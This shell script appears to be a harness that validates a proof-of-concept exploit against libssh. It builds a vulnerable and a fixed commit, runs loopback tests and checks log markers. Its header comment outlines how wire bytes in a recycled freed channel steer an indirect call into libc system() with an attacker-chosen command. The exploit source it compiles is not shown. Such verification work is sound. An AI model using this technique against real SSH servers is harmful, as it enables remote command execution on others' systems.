#!/bin/sh
# W14 additive lane: the post-callback indirect call from channel_rcv_data()
# targets real libc system(), not a harness trampoline. The callback's first
# argument is channel->session; wire bytes in the recycled freed channel select
# that pointer, so the wire chooses system()'s command argument. Built against
# the same two pinned commits as run-inline.sh, plain Release, no library source
# change, loopback only.
set -u
cd "$(dirname "$0")" || exit 1
HERE=$(pwd)

V=a540e27659b08828ef61f2910a790f7cf2af9f8d
F=7dfabb1fd213196c4912c314b418ff36c882ea54
VS=libssh-mirror-$V
FS=libssh-mirror-$F

provision() {
    sha=$1; dir=$2
    if [ ! -d "$dir" ]; then
        curl -fsSL --max-time 60 \
            "https://codeload.github.com/libssh/libssh-mirror/tar.gz/$sha" \
            -o "$dir.tar.gz" || return 1
        tar -xzf "$dir.tar.gz" || return 1
    fi
}

build_plain() {
    dir=$1; out=$2
    cmake -S "$dir" -B "$out" -G Ninja \
        -DCMAKE_BUILD_TYPE=Release -DCMAKE_C_COMPILER=clang \
        -DWITH_SERVER=ON -DUNIT_TESTING=OFF -DBUILD_SHARED_LIBS=OFF \
        -DWITH_GSSAPI=OFF -DWITH_ZLIB=OFF >"$out.configure.log" 2>&1 &&
    ninja -C "$out" ssh >"$out.build.log" 2>&1
}

provision "$V" "$VS" && provision "$F" "$FS" || exit 1
for pair in "$VS build-plain-vuln vuln" "$FS build-plain-fixed fixed"; do
    set -- $pair
    src=$1; b=$2; kind=$3
    build_plain "$src" "$b" || exit 1
    clang -std=gnu99 -O1 -g -fno-omit-frame-pointer -DW14_REALSYSTEM \
        -Iasan-shim -I "$b/src" -I "$src/src" -I "$src/include" \
        -I "$b/include" -I "$b" real_wire.c "$b/src/libssh.a" \
        -lcrypto -lpthread -ldl -o "real_wire-plain-$kind-rs" || exit 1
done

if [ ! -f hostkey ]; then
    ssh-keygen -q -t ed25519 -N '' -f hostkey </dev/null >/dev/null 2>&1 || exit 1
fi

PASS=0; FAIL=0
run_lane() {
    n_name=$1; n_kind=$2; n_mode=$3
    mkdir -p "rs-run/$n_name"
    ln -sf "$HERE/hostkey" "rs-run/$n_name/hostkey"
    (cd "rs-run/$n_name" && timeout 25 \
        "$HERE/real_wire-plain-$n_kind-rs" ./hostkey "$n_mode") \
        >"evidence-rs-$n_name.out" 2>&1
    echo "lane $n_name rc=$?"
}

marker_present() {
    [ -f "rs-run/$1/evidence-wire-vuln-groom-realsystem.marker" ] &&
        echo yes || echo no
}

check_vuln() {
    c_out=evidence-rs-$1.out
    c_file=$(marker_present "$1")
    c_d2=$(grep -c 'SERVER data #2' "$c_out")
    c_arm=$(grep -c 'SERVER REALSYS armed fn=' "$c_out")
    c_cl=$(grep -c 'CLIENT realsystem fn=' "$c_out")
    c_tr=$(grep -c 'SERVER EXEC trampoline' "$c_out")
    c_ok=$(grep -c 'CLIENT rc=0 SERVER status=0x0' "$c_out")
    if [ "$c_d2" = 1 ] && [ "$c_arm" = 1 ] && [ "$c_cl" = 1 ] &&
       [ "$c_tr" = 0 ] && [ "$c_ok" = 1 ] && [ "$c_file" = yes ]; then
        PASS=$((PASS+1)); echo "PASS-$1 data2=$c_d2 armed=$c_arm client=$c_cl trampoline=$c_tr clean=$c_ok file=$c_file"
    else
        FAIL=$((FAIL+1)); echo "FAIL-$1 got[$c_d2 $c_arm $c_cl $c_tr $c_ok $c_file]"
    fi
}

run_lane vuln-rs vuln groom-realsystem
check_vuln vuln-rs
if [ "$(marker_present vuln-rs)" = yes ]; then
    mv rs-run/vuln-rs/evidence-wire-vuln-groom-realsystem.marker \
       evidence-rs-sideeffect.kept
fi

run_lane fixed-rs fixed groom-realsystem
f_out=evidence-rs-fixed-rs.out
f_file=$(marker_present fixed-rs)
f_d2=$(grep -c 'SERVER data #2' "$f_out")
f_arm=$(grep -c 'SERVER REALSYS armed' "$f_out")
if [ "$f_d2" = 0 ] && [ "$f_arm" = 0 ] && [ "$f_file" = no ]; then
    PASS=$((PASS+1)); echo "PASS-fixed-rs data2=0 armed=0 file=no"
else
    FAIL=$((FAIL+1)); echo "FAIL-fixed-rs got[$f_d2 $f_arm $f_file]"
fi

# Invalid-callee control: a wire-chosen 0x4141... fn must fault at the
# library's indirect call; real system() is never reached and no file appears.
run_lane vuln-rs-bad vuln groom-realsystem-bad
b_out=evidence-rs-vuln-rs-bad.out
b_file=$(marker_present vuln-rs-bad)
b_bad=$(grep -c 'CLIENT rc=0 SERVER status=0x' "$b_out")
b_ok=$(grep -c 'CLIENT rc=0 SERVER status=0x0' "$b_out")
b_cl=$(grep -c 'CLIENT realsystem fn=0x4141414141414141' "$b_out")
b_done=$(grep -c 'SERVER done data_packets=2' "$b_out")
if [ "$b_bad" = 1 ] && [ "$b_ok" = 0 ] && [ "$b_cl" = 1 ] &&
   [ "$b_done" = 0 ] && [ "$b_file" = no ]; then
    PASS=$((PASS+1)); echo "PASS-vuln-rs-bad client_armed=yes clean=no done=no file=no"
else
    FAIL=$((FAIL+1)); echo "FAIL-vuln-rs-bad got[status=$b_bad clean=$b_ok cl=$b_cl done=$b_done file=$b_file]"
fi

for i in 1 2 3; do
    run_lane "vuln-repeat$i" vuln groom-realsystem
    check_vuln "vuln-repeat$i"
    if [ "$(marker_present "vuln-repeat$i")" = yes ]; then
        mv "rs-run/vuln-repeat$i/evidence-wire-vuln-groom-realsystem.marker" \
           "evidence-rs-repeat$i.kept"
    fi
done

echo "realsystem: $PASS PASS / $FAIL FAIL"
[ "$FAIL" -eq 0 ]
